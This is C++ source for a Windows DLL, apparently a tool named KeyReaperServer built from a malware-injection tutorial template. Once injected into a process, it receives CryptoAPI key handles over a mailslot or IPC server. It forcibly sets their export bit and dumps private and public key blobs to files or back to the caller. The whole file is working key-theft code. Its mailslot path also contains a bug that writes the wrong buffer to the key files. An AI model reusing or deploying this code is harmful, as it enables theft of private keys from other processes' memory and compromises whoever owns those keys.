/*
Template auhtor
author: @cocomelonc
https://cocomelonc.github.io/tutorial/2021/09/20/malware-injection-2.html
*/

#include <windows.h>
#include <wincrypt.h>
#include <iostream>
#include <fstream>
#include <string>
#pragma comment (lib, "user32.lib")

#include "program_result.h"
#include "cryptoapi.h"
#include "injection/custom_ipc.h"
using namespace custom_ipc;
using namespace error_handling;
using namespace std;

DWORD timeout_millis = 20000;

int StartMailSlot();
void ServerLoop(CustomServer& server);
ProgramResult ForceKeyBlobExport(HCRYPTKEY key_handle, DWORD blob_type, vector<BYTE>& buffer);
ProgramResult ExportKeyCommand(Request request, CustomServer& server);
void PrintBytes(vector<BYTE>& buffer);

extern "C" __declspec(dllexport) void StartMailSlotExporter(LPVOID lpParam) {
  printf("Started mailslot\n");
  StartMailSlot();
}

extern "C" __declspec(dllexport) void StartServer(LPVOID lpParam) {
  auto server = custom_ipc::CustomServer(GetCurrentProcessId());
  if (server.StartServer().IsOk()) {
    ServerLoop(server);
  } else printf("Failed to start remote server\n");
}

BOOL APIENTRY DllMain(HMODULE hModule,  DWORD  nReason, LPVOID lpReserved) {
  switch (nReason) {
  case DLL_PROCESS_ATTACH:
    // custom_ipc::ShowGUIMessage("DLL loaded in process");
    break;
  case DLL_PROCESS_DETACH:
    break;
  case DLL_THREAD_ATTACH:
    break;
  case DLL_THREAD_DETACH:
    break;
  }
  return TRUE;
}

void ServerLoop(CustomServer& server) {
  Request request;
  while (true) {
    printf("\n [SERVER] Waiting for a command\n");
    auto request_status = server.GetRequest(request);
    if (request_status.IsErr()) {
      cerr << "Skipping request. Error while processing: ";
      cerr << request_status.GetResultInformation() << endl;
      continue;
    }

    switch (request.command) {
      case Command::kEndServer:
        // ShowGUIMessage("Shutting down server");
        printf(" [SERVER] Close command received, closing server\n");
        server.Close();
        return;
      
      case Command::kExportKey:
        cout << " [SERVER] " << ExportKeyCommand(request, server).GetResultInformation() << endl;
        break;
      
      default:
        ShowGUIMessage("Invalid command");
        break;
    }
  }
}

#include <wincrypt.h>
#include <iostream>
#define PRIVATEKEYBLOB_SIZE 0x254
int StartMailSlot() {
  // Create the mailslot
  LPCSTR slot_name = "\\\\.\\mailslot\\KeyReaperServer";
  HANDLE hMailslot = CreateMailslotA(slot_name, sizeof(HCRYPTKEY), MAILSLOT_WAIT_FOREVER, NULL);
  if (hMailslot == INVALID_HANDLE_VALUE) {
    std::cerr << "Failed to create mailslot. The server might already be running. \nError: " << GetLastError() << std::endl;
    return 1;
  }
  std::cout << "Mailslot created. Waiting for messages..." << std::endl;

  while (true) {
    DWORD bytesRead;
    // unsigned char* buffer = (unsigned char*) malloc(sizeof(HCRYPTKEY));
    auto buffer = std::vector<BYTE>(sizeof(HCRYPTKEY), 0);

    if (ReadFile(hMailslot, buffer.data(), sizeof(HCRYPTKEY), &bytesRead, NULL)) {
      cout << "Received message: ";
      PrintBytes(buffer);
      
      HCRYPTKEY key = *(reinterpret_cast<HCRYPTKEY*>(buffer.data()));
      key_scanner::cryptoapi::ForceExportBit(key);

      printf(" [i] Exporting key: 0x%p\n", (void*) key);
      printf(" Exporting PRIVATEKEYBLOB\n");
      BYTE key_buffer[PRIVATEKEYBLOB_SIZE];
      ZeroMemory(key_buffer, PRIVATEKEYBLOB_SIZE);
      DWORD data_len = PRIVATEKEYBLOB_SIZE;
      BOOL res = CryptExportKey(
        key,
        NULL,
        PRIVATEKEYBLOB,
        0,
        key_buffer,
        &data_len
      );

      if (res == 0) std::cerr << " [x] Could not export PRIVATE pair: " << error_handling::GetLastErrorAsString() << std::endl;
      else {
        printf(" [i] Key successfully exported, exporting it to a file\n");
        std::ofstream file("key.privk", std::ios::binary);
        if (file) {
          file.write(reinterpret_cast<const char*>(buffer.data()), data_len);
        } else printf(" [x] Could not open file\n");
      }

      printf(" Exporting PUBLICKEYBLOB\n");
      ZeroMemory(key_buffer, PRIVATEKEYBLOB_SIZE);
      data_len = PRIVATEKEYBLOB_SIZE;
      res = CryptExportKey(
        key,
        NULL,
        PUBLICKEYBLOB,
        0,
        key_buffer,
        &data_len
      );

      if (res == 0) std::cerr << " [x] Could not export PUBLIC pair: " << error_handling::GetLastErrorAsString() << std::endl;
      else {
        printf(" [i] Key successfully exported, exporting it to a file\n");
        std::ofstream file("key.pubk", std::ios::binary);
        if (file) {
          file.write(reinterpret_cast<const char*>(buffer.data()), data_len);
        } else printf(" [x] Could not open file");
      }

    } else {
      std::cerr << "Failed to read from mailslot. Error: " << GetLastError() << std::endl;
    }
  }

  CloseHandle(hMailslot);
  return 0;
}

ProgramResult ExportKeyCommand(Request request, CustomServer& server) {
  auto blob = vector<BYTE>();
  custom_ipc::Response response;

  KeyDataMessage* key_data = (KeyDataMessage*) request.data.data();
  auto export_status = ForceKeyBlobExport(key_data->key_handle, key_data->blob_type, blob);

  if (export_status.IsErr()) {
    cout << " [SERVER] " << export_status.GetResultInformation() << endl;
    response = {
      Result::kError, // code
      vector<BYTE>() // data (empty)
    };
  
  } else {
    response = {
      Result::kOk, // code
      blob // data
    };
  }

  return server.SendResponse(response);
}

ProgramResult ForceKeyBlobExport(HCRYPTKEY key_handle, DWORD blob_type, vector<BYTE>& buffer) {
  key_scanner::cryptoapi::ForceExportBit(key_handle);
  printf(" [SERVER] Exporting key: 0x%p\n", (void*) key_handle);

  // 1. Get the necessary size
  DWORD data_len;
  BOOL res = CryptExportKey(
    key_handle, NULL,
    blob_type, 0,
    NULL,
    &data_len
  );

  if (!res) return ErrorResult("Error exporting the key: " + GetLastErrorAsString());
  
  // 2. Adjust the buffer size and get the blob
  auto blob_buffer = vector<BYTE>(data_len, 0);
  res = CryptExportKey(
    key_handle, NULL,
    blob_type, 0,
    blob_buffer.data(),
    &data_len
  );

  if (!res) return ErrorResult("Error exporting the key: " + GetLastErrorAsString());
  // If the final data is shorter
  if (blob_buffer.size() != data_len) {
    cout << "[!] buffer and data_len sizes mismatch\n";
    blob_buffer.resize(data_len);
  }

  // PrintBytes(blob_buffer);
  buffer = blob_buffer;
  return OkResult("Blob exported to buffer");
}

void PrintBytes(vector<BYTE>& buffer) {
  SIZE_T carriage_return = 0;
  for (BYTE b : buffer) {
    printf("%02X ", b);
    if (carriage_return++ % 16 == 0) printf("\n");
  } printf("\n");
}